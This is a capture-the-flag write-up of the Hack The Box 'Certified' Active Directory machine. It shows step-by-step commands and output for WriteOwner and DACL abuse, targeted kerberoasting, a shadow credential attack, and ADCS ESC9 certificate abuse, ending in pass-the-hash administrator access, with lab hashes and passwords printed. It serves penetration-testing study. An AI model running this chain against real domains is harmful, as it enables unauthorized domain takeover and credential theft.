---
{"dg-publish":true,"permalink":"/ct-fs/htb/certified/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #AD #ADCS #certipy-ad #ESC9 #bloodhound #assumed_breach #nxc #evil-winrm

## Recon
![Pasted image 20260924111438.png](/img/user/Pasted%20image%2020260924111438.png)
This one also features an assumed breach style box.
### Nmap:
```zsh
nmap -p53,88,139,135,389,445,464,593,636,3269,3268,5985,9389,49668,49694,49695,49693,49724,49733,49776 -sV -sC -T4 -Pn -oA 10.129.231.186 10.129.231.186
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 14:22 -0400
Nmap scan report for 10.129.231.186
Host is up (0.093s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-25 01:22:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-09-25T01:23:40+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-09-25T01:23:40+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-25T01:23:40+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-09-25T01:23:40+00:00; +7h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
49733/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-25T01:23:01
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.21 seconds
------------------------------------------------------------

```
Initial port scanning shows the common suite of Windows ports including LDAP, SMB and Microsoft HTTPAPI

### SMB enumeration
#### SMB access enumeration
```zsh
└─$ nxc smb DC01.certified.htb -u 'judith.mader' -p 'judith09' --shares       
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.231.186  445    DC01             [*] Enumerated shares
SMB         10.129.231.186  445    DC01             Share           Permissions     Remark
SMB         10.129.231.186  445    DC01             -----           -----------     ------
SMB         10.129.231.186  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.231.186  445    DC01             C$                              Default share
SMB         10.129.231.186  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.231.186  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.231.186  445    DC01             SYSVOL          READ            Logon server share
```
Enumerating open share access on this machine doesn't immediately reveal anything interesting.

```zsh
└─$ nxc smb DC01.certified.htb -u 'judith.mader' -p 'judith09' --users-export users.txt
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.231.186  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.231.186  445    DC01             Administrator                 2024-05-13 14:53:16 0       Built-in account for administering the computer/domain 
SMB         10.129.231.186  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.231.186  445    DC01             krbtgt                        2024-05-13 15:02:51 0       Key Distribution Center Service Account 
SMB         10.129.231.186  445    DC01             judith.mader                  2024-05-14 19:22:11 0        
SMB         10.129.231.186  445    DC01             management_svc                2024-05-13 15:30:51 0        
SMB         10.129.231.186  445    DC01             ca_operator                   2024-05-13 15:32:03 0        
SMB         10.129.231.186  445    DC01             alexander.huges               2024-05-14 16:39:08 0        
SMB         10.129.231.186  445    DC01             harry.wilson                  2024-05-14 16:39:37 0        
SMB         10.129.231.186  445    DC01             gregory.cameron               2024-05-14 16:40:05 0        
SMB         10.129.231.186  445    DC01             [*] Enumerated 9 local users: CERTIFIED
SMB         10.129.231.186  445    DC01             [*] Writing 9 local users to users.txt
```
We enumerate valid users on the server and offload them to `users.txt`
##### Vulnerability Checks (nxc)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/certified/scanning]
└─$ nxc smb DC01.certified.htb -u 'judith.mader' -p 'judith09' -M coerce_plus          
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09 
COERCE_PLUS 10.129.231.186  445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 10.129.231.186  445    DC01             VULNERABLE, PetitPotam
[14:31:37] ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                              coerce_plus.py:178
           ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                              coerce_plus.py:178
COERCE_PLUS 10.129.231.186  445    DC01             VULNERABLE, MSEven

```
We successfully evaluate this target is vulnerable to several different forms of [coercion](https://attack.mitre.org/techniques/T1187/)AKA Forced Authentication. However, it ended up not being a focus of ours during this machine.

>[!info]
>![Pasted image 20260924113608.png](/img/user/Pasted%20image%2020260924113608.png)

### ADCS Enumeration
#### Judith Context
```zsh
---SNIP---
           "CERTIFIED.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Domain Computers",
            "CERTIFIED.HTB\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "CERTIFIED.HTB\\Domain Computers"
      ],
      "[*] Remarks": {
        "ESC2 Target Template": "Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.",
        "ESC3 Target Template": "Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1."
      }
    },
    "21": {
      "Template Name": "MachineEnrollmentAgent",
      "Display Name": "Enrollment Agent (Computer)",
      "Enabled": false,
      "Client Authentication": false,
      "Enrollment Agent": true,
      "Any Purpose": false,
      "Enrollee Supplies Subject": false,
      "Certificate Name Flag": [
        134217728,
        268435456
      ],
      "Enrollment Flag": [
      ---SNIP---
```
I pulled ADCS data with `certipy-ad find` on our compromised user and didn't find anything of note in terms of usable exploits within our context.

## Initial Access
### Bloodhound Enumeration
![Pasted image 20260924120544.png](/img/user/Pasted%20image%2020260924120544.png)
Pulling Bloodhound loot via [nxc](https://www.netexec.wiki/ldap-protocol/bloodhound-ingestor) we run the saved query "Shortest path from owned objects" and we discover that we have the `WriteOwner` permission set over the Management group for this domain.
#### WriteOwner Exploit steps
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/certified]
└─$ impacket-owneredit -action write -new-owner judith.mader -target MANAGEMENT certified.htb/judith.mader:judith09
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!

└─$ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'   
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20260924-153233.bak
[*] DACL modified successfully!

┌──(kali㉿kali)-[~/CTF/HTB/certified]
└─$ net rpc group addmem "Management" "judith.mader" -U certified.htb/judith.mader%judith09 -S 10.129.231.186

└─$ nxc ldap DC01.certified.htb -u 'judith.mader' -p 'judith09' --groups MANAGEMENT                              
LDAP        10.129.231.186  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09 
LDAP        10.129.231.186  389    DC01             judith.mader
LDAP        10.129.231.186  389    DC01             management_svc
```
We successfully changed the owner of the group from Domain Admins to our compromised user `judith.mader`. We then must edit the permissions of our owner and give them the 'write' permission allowing us to then add our same user as a member of the group so that we may abuse this group's object control via `net rpc group addmem`

![Pasted image 20260924121136.png](/img/user/Pasted%20image%2020260924121136.png)
We then see as the owner and newest member of the Management group gives us `GenericWrite` over the account `MANAGEMENT_SVC`. We can attempt a targeted kerberoast and/or a shadow credential attack with this vulnerability.

#### GenericWrite Exploit Steps
##### Targeted Kerberoast

```zsh
┌──(p3v)─(kali㉿kali)-[~/CTF/HTB/certified]
└─$ faketime '2026-09-24 22:18:02' /opt/targetedKerberoast/targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09' --request-user MANAGEMENT_SVC
[*] Starting kerberoast attacks
[*] Attacking user (MANAGEMENT_SVC)
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$f6236b7e1808e49027966add056be871$09593289b386fb868a4744de40b364954fc3aad20a2e7d0ddfd9bee598cb5c0f3ad20a2081232621810abb4af85d19b078e9719be1d4eb7a8b49e82a20bf68bae4c30ededaf03b6772eb8cc8ffba938af9bfbe6614102d8b4e2fe134467aebd02321e5b9187cb8a04c1d2d15fae1dfb560c5bb80cce534b735b8d5ea74b69ea3873d2ac8fc9b4220f89abefc89183f7d116fe419be7ec5ca7a8234b0207bc7d2a458c6d8676a645ffd7e7744f9250a44c22ee6470d8761f6fafcc56928290d78e835a56b9f10286d2f6a1552276704b03fd31e5a5b75e4494f01c549cb48f322d19dd66d1c1e1bd772f1b1fb56764396aebd5a0115b4da5ec158c9e52ae9e3f5e797fbf8689576f73cf0654ff8966f7ca5a736e1f8e577ff287f21df199b3a2d7b18151d07faa558761ca9c6767d3a1aa21a258b58c12e6a7d64353b84582116592b703a308f234c41d39c70ca9da547f9c4cd9028ac167592ca5f83e1b3f072592ea9fc729f440a95f5cff9f1eecfb6005cb809e2b8940c50c6ea98b0b0479e8420ef8bf35c9c6dc91476d052751a5f0e5f79853be88fe8abdd626da7a1d8f360ce4151fa3961be6ca3cb99017e857ecb306338a0983852a10e12e63dd9535ce75970ad9f74ed47431d19cc7bb7379ccc1dcd44ea21b21f875409a4f0d2b722065ec587ab22e7952900b7da220aa509cc33f3056ca5c600a129978c3b4a62e9f9f159b73064f864def182b5c5cc58096c7cef0ce4140c81fb247987c6cdba88a4065b4234563e5bd5efc2d1129a6676df9d89411bcd66d114f671e1491dfa7d4c075cc996ae7884be57ad1079e091a1beab1dfb24a20a87fdbb21d6dd347e2570e724681d846eb05ad0d0559913de75450636e53def31e93cc69f35b36dd00b602c4246e91a435915d199f7d2d21664ddb866c844e4a0927cc857cb7bc926ff8f3849fe7fd42f54f7ad1f1c98119cd72b782a62d752fc138183432383d88c103116232a7b2f8ee14492a67383f7b7e3bad52a1326b779dd7981afb92c111ba01e49270002bfeccf82232e62e3d67fcd3ba72904cf05e3251b8ea86801af114dee104082aed49de9f54ba2c6bca1769b1a4be54d3633231b888f99616f3741a025f740b8a3a48b028e738e1e4dc0b8383add2218bf2979e31e8c2a230365cb2d6a4a1a2274bb0f12b4449908d4edffc1c92a0571a979f1785642bda2a70f27465845a66232342cbaf227d82f45a28b78f78703af801cf8331e4a3539bc821775ec5134cdc6b1de56480edf619890b96664e10daf05d5f0d5b0baf88906cc17ef43e12570fc53a81c5086fa824ee804c54010770aa1ec411d4f7e089bb8fd41dac98e61c7649d4a674f18781f4476c3a634e709ef1d437ec43b1ee0206c93352baafff197271820200896ef3b9557051e5b8b78be49ef5bc994a5357fe384f504659615e336ceef4bcbead8c2de4002124eccd4cccf192b184455f924bd666727e69d5309328fee5c5cdb7e8218d6c61a53398ba10ee4fcd7e39de5601830c6257890279ea1aa1a20f09d2dfb564f7ca3c55018d03aac4f259636
```
We successfully get the TGS hash for the service account with a targeted kerberoast. However, cracking it may prove challenging.

![Pasted image 20260924122333.png](/img/user/Pasted%20image%2020260924122333.png)
After several minutes, even with rules included, `jtr` completely hangs and whitewalls my processor output meaning this hash is a beefy one and unlikely to be cracked within the CTF style context. That said, it's always important to give hashes proper time to be cracked if they're gathered in a real-world engagement. With that in mind, I think it's time to pivot to shadow credential attacks. We can attempt to automate this via `certipy-ad`
##### Shadow Credential Attack
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/certified]
└─$ faketime '2026-09-24 22:44:40' certipy-ad shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account MANAGEMENT_SVC -dc-ip 10.129.231.186
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c5cfc1cea04049bfac62e82b77c74e85'
[*] Adding Key Credential with device ID 'c5cfc1cea04049bfac62e82b77c74e85' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'c5cfc1cea04049bfac62e82b77c74e85' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```
We successfully perform the shadow credential attack stealing the TGT for user `management_svc` as well as leaking their NT hash for Pass-the-Hash attacks right to our stdout.

##### GenericAll and User.txt
![Pasted image 20260924124723.png](/img/user/Pasted%20image%2020260924124723.png)
This is valuable because `management_svc` has full control over the `CA_OPERATOR` user which I'm assuming we can abuse ADCS with in some way.


![Pasted image 20260924125020.png](/img/user/Pasted%20image%2020260924125020.png)
Also of note this user is the only member of Remote Management meaning this is the only user, as it stands currently, that we can get an `evil-winrm` session with. Chances are `user.txt` is hiding in their User folder somewhere



```zsh
└─$ evil-winrm -H 'a091c1832bcdd4677c28b5a6a1295584' -u 'management_svc' -i 10.129.231.186
                                        
Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents>
*Evil-WinRM* PS C:\Users\management_svc> dir Desktop


    Directory: C:\Users\management_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/24/2026   6:12 PM             34 user.txt

```
And just like I thought, `user.txt` is sitting in the `management_svc` user's Desktop folder.

## Privilege Escalation
### ADCS Abuses
#### GenericAll Abuse
```zsh
*Evil-WinRM* PS C:\Users\management_svc> net user CA_OPERATOR "Password123!" /domain
The command completed successfully.
```
Our next step is to pivot into the `CA_OPERATOR` user. Since we have `GenericAll` permissions set for that user we can force change the user's password to whatever we want. I use my previous `evil-winrm` session to use PowerShell's built-in `net user` command and successfully change `ca_operator` user's password to: `Password123!`
#### Certificate Enumeration
```zsh
└─$ certipy-ad find -u ca_operator@certified.htb -p 'Password123!' -dc-ip 10.129.231.186 -target 10.129.231.186
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260924160518_Certipy.txt'
[*] Wrote text output to '20260924160518_Certipy.txt'
[*] Saving JSON output to '20260924160518_Certipy.json'
[*] Wrote JSON output to '20260924160518_Certipy.json'
```
I then re-pull the ADCS data via `certipy-ad find` for our new user context under `ca_operator`. This also validates that we did successfully force change their password.
#### Vulnerability identification and exploitation (ESC9)
```zsh
 "Certificate Templates": {
    "0": {
      "Template Name": "CertifiedAuthentication",
      "Display Name": "Certified Authentication",
      "Certificate Authorities": [
        "certified-DC01-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": false,
      "Certificate Name Flag": [
        33554432,
        2147483648
      ],
      "Enrollment Flag": [
        8,
        32,
        524288
      ],
      "Extended Key Usage": [
        "Server Authentication",
        "Client Authentication" <---
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 2,
      "Validity Period": "1000 years",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2024-05-13 15:48:52+00:00",
      "Template Last Modified": "2024-05-13 15:55:20+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "CERTIFIED.HTB\\operator ca", <---
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "CERTIFIED.HTB\\Administrator",
          "Full Control Principals": [
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "CERTIFIED.HTB\\operator ca"
      ],
      "[!] Vulnerabilities": {
        "ESC9": "Template has no security extension."
      },
      "[*] Remarks": {
        "ESC9": "Other prerequisites may be required for this to be exploitable. See the wiki for more details."
      }
    },
```
According to the certipy output we can see that Template 0: CertifiedAuthentication was flagged as vulnerable to [ESC9](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template): "Template has no security extension". 

>[!info]
>![Pasted image 20260924131451.png](/img/user/Pasted%20image%2020260924131451.png)
>According to certipy's wiki we there are three key factors to determining if a certificate template is truly vulnerable to ESC9: 1. The DC Certificate Binding Mode must be set to Disabled 2. The template must include "Client Authentication" in the Extended Key Usage (EKU) section. 3. Our user must have enrollment rights on the template.

As you can see above our template itself shows it satisfies conditions two and three. As for the first one I googled a powershell command to find out since our `evil-winrm` session is still active for `management_svc`
```zsh
*Evil-WinRM* PS C:\Users\management_svc> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement" -ErrorAction SilentlyContinue | 
    Select-Object -Property StrongCertificateBindingEnforcement
 

StrongCertificateBindingEnforcement
-----------------------------------
                                  0
```
We successfully determine that condition 1 has been met. This cert template is indeed vulnerable to ESC9. Let's begin.
##### Exploit Steps (ESC9)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/certified/loot]
└─$ certipy-ad account -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -upn 'administrator@certified.htb' -user 'ca_operator' update   
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator@certified.htb
[*] Successfully updated 'ca_operator'
```
Since we know our `management_svc` user has `GenericAll` permission over our `ca_operator` user we can use this to set the UPN of the Administrator to `ca_operator` temporarily.

```zsh
└─$ certipy-ad req -u 'ca_operator@certified.htb' -p 'Password123!' -dc-ip 10.129.231.186 -target 'DC01.certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@certified.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```
Next, since our UPN has been set to administrator without being forced to set the SID for the account, we can then make a certificate request to the DC via our vulnerable template and it generates a PFX credential for our UPN (Administrator) and does not check to see if the SID has been set properly.

```zsh
└─$ certipy-ad account -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -upn 'ca_operator@certified.htb' -user 'ca_operator' update
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'

```
Now that we have the PFX file we revert the `ca_operator` user's upn back to it's original state so that the system won't issue a mismatch error when trying to authenticate in our next step.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/certified/loot]
└─$ faketime '2026-09-24 23:46:06' certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'certified.htb' -dc-ip 10.129.231.186                          
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certified.htb'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

┌──(kali㉿kali)-[~/CTF/HTB/certified/loot]
└─$ evil-winrm -i 10.129.231.186 -H '0d5b49608bbce1751f708748f67e2d34' -u administrator
                                        
Evil-WinRM shell v3.9
                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/24/2026   6:12 PM             34 root.txt

```
We successfully authenticate to the CA with our PFX file and generate the Administrator user's kerb ccache cred and dump it's NTLM hash to stdout. We then use the NT hash to authenticate with pass-the-hash via `evil-winrm` and find `root.txt` sitting in the Administrator's Desktop folder. pwned.


## Final Thoughts
>[!Takeaways]
>- Follow the directions carefully for bloodhound abuses (i.e. `WriteOwner`, `GenericAll`, etc.)
>- Remember for ESC9 you must have the ability to write changes to an AD object for the standard exploit pathway (i.e. `management_svc` having `GenericAll` over `ca_operator`. Otherwise ESC6 must also be present to exploit.
>- Trust your instincts. Ask questions. Find out if the tools you already know can do the thing you're seeking.



